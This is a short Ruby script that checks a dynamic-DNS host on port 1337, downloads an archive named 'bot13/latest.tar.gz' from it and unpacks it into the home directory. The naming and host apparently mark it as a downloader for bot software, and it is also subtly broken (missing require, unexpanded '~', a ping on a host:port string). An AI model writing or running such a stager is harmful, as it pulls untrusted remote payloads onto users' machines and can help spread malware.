#!/usr/bin/ruby
$host = "antifreezze.ddns.net:1337"
$path = "http://#{$host}/bot13/latest.tar.gz"

def download(r,l)
	uri = URI(r)
	res = true
	Net::HTTP.start(uri.host,uri.port) do |h|
		r = h.get(uri.path)
		res = false if r.code != 200
		File.open(l,"wb") do |f|
			f.write(r.body)
		end
	end
	return res
end

if system "ping #{$host}" then
	if download($path,"~/bot13.tar.gz") then
		system "tar -xvzf ~/bot13.tar.gz -C ~/bot13"
	else
		puts "Cant download #{$path}"
	end
end
